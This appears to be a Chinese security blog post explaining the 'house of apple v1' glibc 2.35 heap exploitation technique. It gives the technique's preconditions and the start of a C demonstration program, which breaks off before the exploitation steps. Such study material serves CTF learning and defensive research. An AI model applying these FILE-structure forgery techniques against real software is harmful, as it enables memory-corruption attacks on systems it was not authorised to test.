<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="house of apple这种利用方式针对于新版的glibc，在这个资料中有详细的分析与说明。这里根据该资料进行简单总结，并编写示例程序便于理解。 在house of pig中，我们需要使用两次large bin attack攻击作为前菜，第一次需要修改_IO_list_all指针的值，第二次需要修改__free_hook附近空间的值。而与之形成对比的是，house of apple只需要1次l">
<meta property="og:type" content="article">
<meta property="og:title" content="glibc 2.35 pwn——house of apple v1 示例程序">
<meta property="og:url" content="http://hornos3.github.com/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:description" content="house of apple这种利用方式针对于新版的glibc，在这个资料中有详细的分析与说明。这里根据该资料进行简单总结，并编写示例程序便于理解。 在house of pig中，我们需要使用两次large bin attack攻击作为前菜，第一次需要修改_IO_list_all指针的值，第二次需要修改__free_hook附近空间的值。而与之形成对比的是，house of apple只需要1次l">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-02-28T14:15:00.000Z">
<meta property="article:modified_time" content="2023-03-01T03:31:11.058Z">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-cn'
  };
</script>

  <title>glibc 2.35 pwn——house of apple v1 示例程序 | CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v1-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          glibc 2.35 pwn——house of apple v1 示例程序
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:15:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:15:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>house of apple这种利用方式针对于新版的glibc，在<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273418.htm">这个资料</a>中有详细的分析与说明。这里根据该资料进行简单总结，并编写示例程序便于理解。</p>
<p>在house of pig中，我们需要使用两次large bin attack攻击作为前菜，第一次需要修改<code>_IO_list_all</code>指针的值，第二次需要修改<code>__free_hook</code>附近空间的值。而与之形成对比的是，house of apple只需要1次large bin attack即可完成攻击。这里需要注意：<font color=red><strong>house of apple并不是一个可以直接getshell的攻击方式，它更像是一种攻击思路，一种只使用一次large bin attack进行FSOP的思路，在house of apple之后可以接上多种多样的攻击方式来达到我们最终的目的。考虑到与<code>FILE</code>结构体有关的函数有很多都是可以利用的，因此在具体的情境下，攻击的流程一般较为灵活。</strong></font></p>
<blockquote>
<p>使用house of apple的条件为：<br>1、程序从main函数返回或能调用exit函数<br>2、能泄露出heap地址和libc地址<br>3、 能使用一次largebin attack（一次即可）</p>
</blockquote>
<p>house of apple v1通过exit函数触发，exit调用到<code>_IO_flush_all_lockp</code>，后者遍历<code>_IO_list_all</code>中的<code>FILE</code>结构体并依次执行跳表中的overflow函数。在本利用方式中，使用伪造的<code>FILE</code>结构体，<code>vtable</code>填写<code>_IO_wstrn_jumps</code>，这样可以执行到<code>_IO_wstrn_overflow</code>函数，而<code>_IO_wstrn_overflow</code>会进行一系列赋值操作，将假<code>FILE</code>结构体的<code>_wide_data</code>字段保存的地址附近写入多个值。</p>
<p>具体的利用方式详见下面的示例程序，在开头提到的资料中还有针对house of apple攻击后的一系列可能的后续操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 23-1-10.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> victim[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_victim</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;修改后：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim, <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示house of apple v1利用方式。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;测试于ubuntu 22.04，glibc版本：Ubuntu GLIBC 2.35-0ubuntu3.1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;house of apple并不是一个能直接getshell的攻击方式，它的功能是在任意地址写堆地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在很多赛题中，house of apple只是一个引子，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;在第一个FILE后面接其他的FILE结构体可以实现多种方式的利用。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本演示程序就是利用第二个伪造的FILE结构体打印house of apple的攻击效果。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在house of apple v1中，利用的核心思想是FILE结构体中的_wide_data字段。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;再一次重温FILE结构体的内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h, line 334)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_complete_plus\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE_complete file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libioP.h, line 324)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_plus\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/bits/types/struct_FILE.h, line 85)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_FILE_complete\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE _file;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __off64_t _offset;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Wide character stream stuff.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt *_codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct 